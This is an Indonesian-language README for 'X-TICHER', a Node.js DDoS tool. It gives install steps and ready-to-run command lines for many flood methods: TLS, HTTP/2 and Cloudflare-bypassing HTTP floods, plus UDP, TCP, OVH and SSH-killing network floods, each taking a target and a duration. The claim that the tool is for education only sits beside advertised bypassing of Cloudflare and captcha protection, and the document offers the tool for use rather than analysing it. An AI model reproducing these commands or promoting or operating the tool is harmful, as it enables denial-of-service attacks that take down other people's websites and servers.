# 🛡️ X-TICHER DDoS TOOL [v1.0.0]

![Banner](https://i.postimg.cc/x8P6pnQj/file-000000003090622fa3716dd1f8a0db60-1.png)

**X-TICHER** adalah tools Layer 4 & Layer 7 DDoS (Denial-of-Service) berbasis CLI yang dikembangkan dengan tujuan edukasi & pengujian performa jaringan. Tools ini menawarkan berbagai metode serangan HTTP dan jaringan TCP/UDP lengkap dengan dukungan proxy, user-agent rotator, dan interface yang mudah digunakan.

> ⚠️ **DISCLAIMER**: Tools ini hanya boleh digunakan untuk tujuan **pengujian sistem milik sendiri** atau sistem yang Anda miliki izin eksplisit. Penyalahgunaan menjadi tanggung jawab pengguna sepenuhnya.

---

## ✨ FITUR UNGGULAN

- 🔹 Layer 7 (HTTP Flood): HTTPS, TLS, H2, UAM, NOSEC, dll.
- 🔸 Layer 4 (Network Flood): UDP, TCP, OVH, PING, KILLSSH, dll.
- 🔁 Bypass perlindungan Cloudflare & Captcha
- 🌐 Integrasi GeoIP untuk informasi target
- 🧠 Otomatisasi Proxy dan User-Agent Rotator
- 🖥️ CLI interaktif dan mudah digunakan
- 🚀 Bisa digunakan di Linux, Termux, Windows (via WSL/Node.js)

---

## 💻 INSTALLASI

### 1. Persiapan

Pastikan kamu sudah menginstal **Node.js** (v18 ke atas):

```bash
node -v
# Jika belum ada:
sudo apt install nodejs npm -y
```

### 2. Clone Repository

```bash
git clone https://github.com/Dikatoki969/XTicher-ddos.git
cd XTicher-ddos
npm install
```

### 3. Jalankan Tools

```bash
node ddos.js
```

---

## 🧠 PENGGUNAAN

Setelah `node ddos.js`, ketik command:

### 🎛️ Melihat Menu

```bash
menu
```

### 🌐 Layer 7 Attack (HTTP)

```bash
tls https://target.com 120
https https://target.com 90
h2 https://target.com 60
uam https://target.com 100
nosec https://target.com 80
```

### 📡 Layer 4 Attack (TCP/UDP)

```bash
udp 1.2.3.4 80 60
tcp 1.2.3.4 22 90
ovh 1.2.3.4 443 60
killssh 1.2.3.4 120
killdo 1.2.3.4 150
ping 1.2.3.4 60
tcpnew 1.2.3.4 80 60
down https://target.com 120
```

> Gunakan durasi dalam satuan detik.

---

## 🎥 DEMO VIDEO

[![Video demo](https://i.postimg.cc/WbHzyynT/Beige-Minimalist-Hand-Holding-Phone-Mockup-Instagram-Post.png)](https://youtube.com/shorts/8pL1rRDKtCE?si=oPsYumTvgv5AssNU)

---

## 📦 STRUKTUR FILE

```
x-ticher-ddos/
│
├── ddos.js               # Main CLI tools
├── README.md             # Dokumentasi (ini file-nya)
├── /ddos                 # Folder metode serangan
│     ├── tls.js
│     ├── h2.js
│     ├── ...
│
├── /proxy                # File pendukung
│     ├── ua.txt
│     ├── proxy.txt
│     ├── cockie.txt
```

---

## 📋 CONTOH HASIL OUTPUT

```bash
➔: tls https://example.com 120

░█░█░░░░░▀█▀░▀█▀░█▀▀░█░█░█▀▀░█▀▄
░▄▀▄░▄▄▄░░█░░░█░░█░░░█▀█░█▀▀░█▀▄
░▀░▀░░░░░░▀░░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
[ SYSTEM ] Berhasil mengirim DDOS!
Target   : https://example.com
Duration : 120
Method.  : TLS
Status   : Sukses
Creator  : https://t.me/dikatoki111
```

---

## 🧹 FITUR AUTO CLEAN EXIT

Tools ini menangani keluar otomatis dengan baik, misalnya saat kamu menekan `CTRL+C`, semua proses akan dibersihkan:

```js
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
```

---

## 🔗 KONTAK & KOMUNITAS

- 👤 Creator: [@dikatoki111](https://t.me/dikatoki111)
- 📤 Email: [ahmadandhika969@gmail.com](ahmadandhika969@gmail.com)
- 🤖 Telegram Bot: [@dikatoki_bot](https://t.me/dikatoki_bot)
- 📣 Channel WhatsApp: [Join di sini](https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O)

---

## ⚠️ DISCLAIMER

Tool ini dibuat **hanya untuk tujuan edukasi & pengujian**. Segala penyalahgunaan terhadap tools ini seperti:
- Menyerang website tanpa izin
- Menyerang server publik
- Menjual tools ke pihak tak bertanggung jawab

adalah **tanggung jawab pribadi pengguna** dan **tidak berkaitan dengan developer**.

---

## 🪪 LISENSI

MIT License – Silakan fork, modifikasi, dan gunakan dengan tanggung jawab.
